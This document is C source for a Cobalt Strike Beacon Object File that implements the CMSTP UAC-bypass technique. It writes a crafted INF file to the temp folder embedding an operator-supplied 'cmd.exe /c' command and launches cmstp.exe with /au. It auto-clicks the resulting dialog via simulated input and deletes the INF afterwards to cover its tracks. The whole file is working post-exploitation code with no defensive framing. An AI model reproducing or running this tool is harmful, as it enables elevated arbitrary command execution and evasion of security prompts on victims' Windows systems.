#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT char * MSVCRT$strcat(char * destination, const char * source);
DECLSPEC_IMPORT int MSVCRT$sprintf(char* buffer, const char* format, ...);
DECLSPEC_IMPORT size_t MSVCRT$strlen(const char* str);
DECLSPEC_IMPORT char* MSVCRT$strncpy(char* destination, const char* source, size_t num);
DECLSPEC_IMPORT int MSVCRT$_snprintf(char* buffer, size_t count, const char* format, ...);

DECLSPEC_IMPORT WINBASEAPI HWND WINAPI USER32$FindWindowA(LPCSTR lpClassName, LPCSTR lpWindowName);
DECLSPEC_IMPORT WINBASEAPI void WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI USER32$SetForegroundWindow(HWND hWnd);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI USER32$ShowWindow(HWND hWnd, int nCmdShow);
DECLSPEC_IMPORT WINBASEAPI HWND WINAPI USER32$FindWindowExA(HWND hWndParent, HWND hWndChildAfter, LPCSTR lpszClass, LPCSTR lpszWindow);
DECLSPEC_IMPORT WINBASEAPI LRESULT WINAPI USER32$SendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
DECLSPEC_IMPORT WINBASEAPI UINT WINAPI USER32$SendInput(UINT cInputs, LPINPUT pInputs, int cbSize);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetTempPathA(DWORD nBufferLength, LPSTR lpBuffer);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetTickCount(void);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT WINBASEAPI UINT WINAPI KERNEL32$GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$DeleteFileA(LPCSTR lpFileName);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$GetExitCodeProcess(HANDLE hProcess, LPDWORD lpExitCode);

BOOL interact_with_window(const char* window_title) {
    HWND hwnd;
    int attempts = 0;
    while (attempts < 20) {
        hwnd = USER32$FindWindowA(NULL, window_title);
        if (hwnd != NULL) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Found window: %s", window_title);
            USER32$SetForegroundWindow(hwnd);
            USER32$ShowWindow(hwnd, SW_SHOWNORMAL);

            HWND ok_button = USER32$FindWindowExA(hwnd, NULL, NULL, "OK");
            if (ok_button) {
                BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Clicking OK button");
                USER32$SendMessageA(ok_button, BM_CLICK, 0, 0);
                return TRUE;
            }

            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Sending Enter key");
            INPUT input = {0};
            input.type = INPUT_KEYBOARD;
            input.ki.wVk = VK_RETURN;
            USER32$SendInput(1, &input, sizeof(INPUT));
            KERNEL32$Sleep(100);
            
            input.ki.dwFlags = KEYEVENTF_KEYUP;
            USER32$SendInput(1, &input, sizeof(INPUT));
            return TRUE;
        }
        KERNEL32$Sleep(250);
        attempts++;
    }
    return FALSE;
}

__attribute__((section(".text")))
void go(char* args, int len) {
    datap parser;
    char* command;

    // Initialize the parser
    BeaconDataParse(&parser, args, len);
    // Extract string
    command = BeaconDataExtract(&parser, NULL);

    if (!command || !*command) {
        BeaconPrintf(CALLBACK_ERROR, "Please specify a command to execute");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Extracted command length: %d", MSVCRT$strlen(command));
    BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Command: %s", command);

    char temp_path[256], inf_path[256];
    KERNEL32$GetTempPathA(256, temp_path);
    MSVCRT$sprintf(inf_path, "%scmstp_%lu.inf", temp_path, KERNEL32$GetTickCount());
    
    // Modified INF template with escaped quotes
    char inf_content[1024];
    MSVCRT$_snprintf(inf_content, 1024, 
        "[version]\n"
        "Signature=$chicago$\n"
        "AdvancedINF=2.5\n"
        "[DefaultInstall]\n"
        "CustomDestination=CustInstDestSectionAllUsers\n"
        "RunPreSetupCommands=RunPreSetupCommandsSection\n"
        "[RunPreSetupCommandsSection]\n"
        "cmd.exe /c \"%s\"\n"
        "taskkill /IM cmstp.exe /F\n"
        "[CustInstDestSectionAllUsers]\n"
        "49000,49001=AllUSer_LDIDSection, 7\n"
        "[AllUSer_LDIDSection]\n"
        "\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%%UnexpectedError%%\", \"\"\n"
        "[Strings]\n"
        "ServiceName=\"CorpVPN\"\n"
        "ShortSvcName=\"CorpVPN\"\n",
        command);
    
    BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Generated INF content:\n%s", inf_content);
    
    HANDLE hFile = KERNEL32$CreateFileA(inf_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
                             FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create INF file");
        return;
    }

    DWORD written;
    KERNEL32$WriteFile(hFile, inf_content, (DWORD)MSVCRT$strlen(inf_content), &written, NULL);
    KERNEL32$CloseHandle(hFile);

    BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Created INF file: %s", inf_path);

    char cmstp_path[256];
    KERNEL32$GetSystemDirectoryA(cmstp_path, 256);
    MSVCRT$strcat(cmstp_path, "\\cmstp.exe");

    char cmstp_cmd[512];
    MSVCRT$_snprintf(cmstp_cmd, 512, "\"%s\" /au \"%s\"", cmstp_path, inf_path);
    BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] CMSTP command: %s", cmstp_cmd);

    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};

    if (!KERNEL32$CreateProcessA(NULL, cmstp_cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] CreateProcess failed: %d", KERNEL32$GetLastError());
        KERNEL32$DeleteFileA(inf_path);
        return;
    }

    KERNEL32$Sleep(1000);
    
    const char* window_titles[] = {"CorpVPN", "cmstp"};
    for (int i = 0; i < 2; i++) {
        if (interact_with_window(window_titles[i])) {
            break;
        }
    }

    KERNEL32$WaitForSingleObject(pi.hProcess, 5000);
    DWORD exit_code;
    KERNEL32$GetExitCodeProcess(pi.hProcess, &exit_code);
    BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Process exit code: %d", exit_code);
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);

    KERNEL32$DeleteFileA(inf_path);
}